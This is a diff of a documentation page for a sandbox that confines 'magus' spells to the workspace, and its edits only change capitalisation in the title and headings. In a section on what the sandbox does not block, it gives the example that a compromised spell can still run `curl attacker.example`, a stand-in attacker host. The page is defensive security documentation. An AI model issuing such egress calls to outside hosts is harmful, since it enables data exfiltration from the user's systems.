@@ -1,5 +1,5 @@
 ---
-title: sandbox diagnostics
+title: Sandbox diagnostics
 page_type: overview
 description: Landing page for the sandbox that confines magus spells to the workspace, plus its MGS2xxx diagnostics for denied reads, writes, execs, and env leaks.
 tags:
@@ -15,7 +15,7 @@ tags:
   ]
 ---
 
-# The sandbox
+# Sandbox diagnostics
 
 The sandbox confines magus's subprocesses and in-process spells to the
 workspace plus a curated allowlist of toolchain, cache and system paths,
@@ -51,7 +51,7 @@ or extension reads credentials from disk and exfiltrates them.
 Without kernel landlock, only what goes through magus's own bindings is
 checked; see [MGS2005](MGS2005.md).
 
-## What sandbox does NOT block
+## What sandbox does not block
 
 - **Network egress.** A compromised spell with no token in its env can
   still `curl attacker.example`.
